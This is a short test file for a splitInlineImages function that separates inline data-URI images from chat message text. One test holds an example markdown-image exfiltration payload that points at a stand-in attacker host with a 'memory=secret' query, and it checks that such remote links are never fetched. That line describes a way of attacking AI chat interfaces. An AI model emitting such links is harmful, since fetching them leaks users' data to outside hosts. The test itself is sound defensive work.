import { splitInlineImages } from "../src/messageImages";

describe("splitInlineImages", () => {
  it("renders inline images", () => {
    const uri = "data:image/png;base64,AAAA";
    expect(splitInlineImages(`Look ${uri}`)).toEqual({
      images: [uri],
      text: "Look",
    });
  });

  it("never treats a remote URL as an image, so it isn't fetched", () => {
    const content = "![x](https://evil.example/p.png?memory=secret)";
    expect(splitInlineImages(content)).toEqual({ images: [], text: content });
  });

  it("ignores SVG data URIs", () => {
    const content = "data:image/svg+xml;base64,AAAA";
    expect(splitInlineImages(content).images).toEqual([]);
  });
});
